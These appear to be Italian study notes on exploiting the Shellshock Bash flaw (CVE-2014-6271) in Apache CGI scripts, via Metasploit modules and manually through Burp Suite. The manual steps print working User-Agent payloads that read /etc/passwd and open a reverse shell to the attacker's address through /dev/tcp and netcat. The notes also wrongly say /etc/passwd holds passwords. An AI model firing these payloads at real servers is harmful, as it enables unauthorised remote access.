E’ una vulnerabilità rara. Shellshock (CVE-2014-6271) è una vulnerabilità che permette di **eseguire comandi** arbitrari con una **Bash** shell con **conseguente** **accesso** ai **sistemi** tramite una **reverse shell**

Sfrutta il fatto che Bash esegua erroneamente dei comandi se seguiti da caratteri speciali come  () {:;};.ù

**Colpisce solo** i **sistemi** **Linux** in quando Windows non utilizza Bash.

**Server web Apache** configurato per l'esecuzione di CGI
o script .sh sono **anch'essi vulnerabili** a questo attacco.

Gli script **CGI** (Common Gateway Interface) sono **utilizzati da Apache** per **eseguire comandi** arbitrari sul sistema Linux, dopodiché l'output viene visualizzato sul client.

### Shellshock Exploitation

Per sfruttare questa vulnerabilità, è necessario **individuare** un **vettore** di **input o** uno **script** che **permetta** di **comunicare** con **Bash**.

Nel c**ontesto di un server web Apache**, possiamo **utilizzare** qualsiasi **script CGI** legittimo **accessibili** sul **server** **web**.

### CON METASPLOIT

1. **Individuare script cgi** Lo individuiamo tramite il source code del sito web (è un percorso di una directory)
2. **search shellshock**
    1. **use auxiliary/scanner/http/apache_mod_cgi_bash_env** Verifica se è presenta la vulnerabilità
    2. **use exploit/multi/http/apache_mod_cgi_bash_env_exeq** exploit vulnerabilità shellshock
        1. set RHOST
        2. **set TARGETURI /PERCORSO_SCRIPT_CGI**

### MANUALE

PRIMO PASSO, ESECUZIONE COMANDI ARBRITRARI

1. **Individuare script cgi** Lo individuiamo tramite il source code del sito web (è un percorso di una directory)
2. **nmap -sV IP_TARGET --script=http-shellshock --script-args “http-shelllock.uri=/PERCORSO_SCRIPT_CGI** trovato il vettore di script controlliamo se la web app è vulnerabile
3. **forxyproxy mettiamo burpsuite** plug in firefox che indirizza il traffico al proxy burpsuite
4. **aprire burpsuite**
    1. proxy
    2. interception on
    3. send to repeater
5. **User-Agent: () { : ; }; echo; echo; /bin/bash -c ‘cat /etc/passwd’** sostituiamo user-agent con questa stringa per implementare la shell
    1. **() { : ; }; echo; echo; /bin/bash -c** ci permette di inviare un comando
    2.  **‘cat /etc/passwd’** comando che cattura le password
6. **send** inviare la pagina con User-agent modificato

SECONDO PASSO, IMPLEMENTAZIONE DI REVERSE SHELL

1. **nc -nvlp 1234** mettiamoci in ascolto su netcat ad una porta
2. **User-Agent: () { : ; }; echo; echo; /bin/bash -c ‘bash -i>& /dev/tcp/MIO_IP/PORTA_NETCAT 0>&1’** comando da inserire al posto del User-Agent per ottenere un shell sulla porta netcat
3. **send**
4. **shell ottenuta sulla porta nc**
